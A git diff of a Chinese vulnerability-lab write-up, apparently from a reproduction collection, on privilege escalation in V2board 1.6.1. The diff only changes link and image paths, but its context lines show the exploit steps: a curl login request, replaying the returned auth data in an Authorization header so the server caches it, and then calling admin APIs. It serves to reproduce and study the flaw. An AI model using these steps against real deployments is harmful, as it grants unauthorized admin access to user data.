@@ -8,7 +8,7 @@ V2board是一个多用户代理工具管理面板。在其1.6.1版本中，引�
 
 参考链接：
 
-- <https://github.com/v2board/v2board/commit/5976bcc65a61f7942ed4074b9274236d9d55d5f0>
+* [https://github.com/v2board/v2board/commit/5976bcc65a61f7942ed4074b9274236d9d55d5f0](https://github.com/v2board/v2board/commit/5976bcc65a61f7942ed4074b9274236d9d55d5f0)
 
 ## 环境搭建
 
@@ -20,7 +20,7 @@ docker-compose up -d
 
 服务启动后，访问`http://your-ip:8080`即可查看到其登录页面。
 
-![image-20230504112004533](images/image-20230504112004533.png)
+![image-20230504112004533](../.gitbook/assets/image-20230504112004533.png)
 
 ## 漏洞复现
 
@@ -30,9 +30,9 @@ docker-compose up -d
 curl -i -s -k -XPOST --data-binary "email=threeki%40abc.com&password=threeki@wh0am1" http://your-ip:8080/api/v1/passport/auth/login
 ```
 
-服务器会返回当前用户的认证信息“auth_data”：
+服务器会返回当前用户的认证信息“auth\_data”：
 
-![image-20230504112219108](images/image-20230504112219108.png)
+![image-20230504112219108](../.gitbook/assets/image-20230504112219108.png)
 
 拷贝这个认证信息，并替换到如下数据包的`Authorization`头中，发送：
 
@@ -47,10 +47,10 @@ Connection: close
 Authorization: dGhyZWVraUBhYmMuY29tOiQyeSQxMCRnb1UzUDBCL25ocTg2blZvYTUvRm5PbVpKUG5yTFptZ2hJa3FUNUdRYndVL003WXNpdVlqMg==
 ```
 
-![image-20230504112604993](images/image-20230504112604993.png)
+![image-20230504112604993](../.gitbook/assets/image-20230504112604993.png)
 
 这一步的目的是让服务器将我们的Authorization头写入缓存中。
 
 最后，只需要带上这个Authorization头，即可使用所有管理员API了。例如`http://your-ip:8080/api/v1/admin/user/fetch`
 
-![image-20230504112709503](images/image-20230504112709503.png)
+![image-20230504112709503](../.gitbook/assets/image-20230504112709503.png)
